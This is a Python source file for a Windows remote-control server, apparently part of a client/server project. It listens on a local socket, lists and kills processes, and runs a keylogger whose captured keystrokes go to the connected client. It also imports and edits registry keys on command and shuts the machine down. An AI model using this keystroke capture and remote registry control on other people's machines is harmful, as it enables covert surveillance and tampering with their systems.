from enum import Flag
import time
import socket
import os, signal
from pynput import keyboard
import subprocess
from pynput import keyboard
import winreg

import Utils.object_handler as oh
import Utils.screen_stream as ss

#load enviroment variables
SERVER_HOST = '127.0.0.1'
SERVER_PORT = 9090
MAX_FILE_SIZE = int(409600)

winregConst = {
    'HKEY_CLASSES_ROOT': winreg.HKEY_CLASSES_ROOT,
    'HKEY_CURRENT_USER' : winreg.HKEY_CURRENT_USER,
    'HKEY_LOCAL_MACHINE' : winreg.HKEY_LOCAL_MACHINE,
    'HKEY_USERS' : winreg.HKEY_USERS,
    'HKEY_PERFORMANCE_DATA' : winreg.HKEY_PERFORMANCE_DATA,
    'HKEY_CURRENT_CONFIG' : winreg.HKEY_CURRENT_CONFIG,
    'HKEY_DYN_DATA' : winreg.HKEY_DYN_DATA,
    'String': winreg.REG_SZ,
    'Binary': winreg.REG_BINARY,
    'DWORD': winreg.REG_DWORD,
    'QWORD': winreg.REG_QWORD,
    'Multi-String': winreg.REG_MULTI_SZ,
    'Expandable String': winreg.REG_EXPAND_SZ
}

#keyborad recode init
keyboardRecord = '' #string save record value
recorded = False

def processKeyPress(key: keyboard.KeyCode):
    key = str(key)
    key = key.replace("'", "")
    global keyboardRecord
    print(key)
    if len(key) == 1:
        keyboardRecord += key
    if (key == 'Key.enter'):
        keyboardRecord += '\n'
    if (key == 'Key.space'):
        keyboardRecord += ' '

listener = keyboard.Listener(on_press=processKeyPress)

#process function
def sendScreenShotImage(conn):
    im = open('screenshot.png', 'rb')
    imBytes = im.read()
    conn.sendall(imBytes)
    pass

def getProcessRunning():
    Data = subprocess.check_output(['wmic', 'process', 'list', 'brief'])
    a = str(Data)
    ret = []
    try:
        for i in range(len(a)):
            temp = (a.split("\\r\\r\\n")[i])
            temp = temp.split(' ')
            try:
                while True:
                    temp.remove('')
            except:
                pass
            if len(temp) == 6:
                ret.append((temp[1], temp[3], temp[4]))
    except IndexError as e:
        ret.append(('done', 'a', 'b'))
    ret.pop(0)
    return ret

def getListRunningWindows():
    cmd = 'powershell "gps | where {$_.MainWindowTitle } | select Description, ID, {$_.Threads.Count}'
    ret = []
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    for line in proc.stdout:
        if not line.decode()[0].isspace():
            temp = (line.decode().rstrip())
            temp = temp.split(' ')
            try:
                while True:
                    temp.remove('')
            except:
                pass
            name = ''
            for i in range(len(temp) - 2):
                if i == 0:
                    name = name + temp[i]
                else:
                    name = name + ' ' + temp[i]
            ret.append((name, temp[len(temp) -  2], temp[len(temp) - 1]))
    ret = ret[2:]
    ret.append(('done', 'a', 'a'))
    return ret

def processRequest(request, conn):
    print(request)
    
    if request[0] == 'process':
        if request[1] == 'watch process':
            temp = getProcessRunning()
            for it in temp:
                oh.send_obj(conn, it)
                time.sleep(0.001)
        if request[1] == 'kill process':
            processId = int(request[2])
            try:
                os.kill(processId, signal.SIGTERM)
                oh.send_obj(conn, ['done'])
            except:
                oh.send_obj(conn, ['error'])
            pass
    
    if request[0] == 'application':
        if request[1] == 'watch application':
            temp = getListRunningWindows()
            print(temp)
            for it in temp:
                oh.send_obj(conn, it)
                time.sleep(0.001)
        if request[1] == 'kill application':
            processId = int(request[2])
            try:
                os.kill(processId, signal.SIGTERM)
                oh.send_obj(conn, ['done'])
            except:
                oh.send_obj(conn, ['error'])
            pass

    if request[0] == 'keystroke':
        if request[1] == 'hook':
            global recorded
            global keyboardRecord
            if recorded == False:
                recorded = True
                keyboardRecord = ''
                listener.start()
        
        if request[1] == 'unhook':
            if recorded == True:
                recorded = False
                listener.stop()

        if request[1] == 'print keyboard':
            oh.send_obj(conn, keyboardRecord)
            print(keyboardRecord)
            keyboardRecord = ''
    
    if request[0] == 'registry':
        if request[1] == 'send file':
            try:
                file = open('regFile.reg', 'w')
                file.write(str(request[2]))
                file.close()
                temp = subprocess.call(['reg', 'import', 'regFile.reg'])
            except:
                print('run reg file error')
        
        if request[1] == 'Get value':
            path = request[2]
            path = path.split('\\', 1)
            valueName = request[3]
            try:
                key = winreg.OpenKey(winregConst[path[0]], path[1], 0, winreg.KEY_ALL_ACCESS)
                temp = winreg.QueryValueEx(key, valueName)
                winreg.CloseKey(key)
                oh.send_obj(conn, temp[0])
            except:
                oh.send_obj(conn, 'error')
        
        if request[1] == 'Set value':
            path = request[2]
            path = path.split('\\', 1)
            valueName = request[3]
            data = request[4]
            dataType = request[5]
            try:
                key = winreg.OpenKey(winregConst[path[0]], path[1], 0, winreg.KEY_ALL_ACCESS)
                temp = winreg.SetValueEx(key, valueName, 0, winregConst[dataType], data)
                winreg.CloseKey(key)
                oh.send_obj(conn, 'done')
            except:
                oh.send_obj(conn, 'error')
            pass            

        if request[1] == 'Delete value':
            path = request[2]
            path = path.split('\\', 1)
            valueName = request[3]
            try:
                key = winreg.OpenKey(winregConst[path[0]], path[1], 0, winreg.KEY_ALL_ACCESS)
                temp = winreg.DeleteValue(key, valueName)
                winreg.CloseKey(key)
                oh.send_obj(conn, 'done')
            except:
                oh.send_obj(conn, 'error')

        if request[1] == 'Create key':
            path = request[2]
            path = path.split('\\', 1)
            try:
                key = winreg.CreateKey(winregConst[path[0]], path[1])
                winreg.CloseKey(key)
                oh.send_obj(conn, 'done')
            except:
                oh.send_obj(conn, 'error')
        
        if request[1] == 'Delete key':
            path = request[2]
            path = path.split('\\', 1)
            try:
                winreg.DeleteKey(winregConst[path[0]], path[1])
                oh.send_obj(conn, 'done')
            except:
                oh.send_obj(conn, 'error')
    
    if request[0] == 'Shutdown':
        os.system('shutdown -s')

if __name__ == '__main__':
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((SERVER_HOST, int(SERVER_PORT)))
        s.listen()
        while True:
            conn, addr = s.accept()
            with conn:
                print('Connected by: ', addr)
                ss.screen_stream(conn)
                #while True:
                #    request = conn.recv(1024) 
                #    requets = oh.receive_obj(conn)
                #    #if not request:
                #     #  break
                #    #print(request)
                #    #processRequest(request, conn)
                conn.close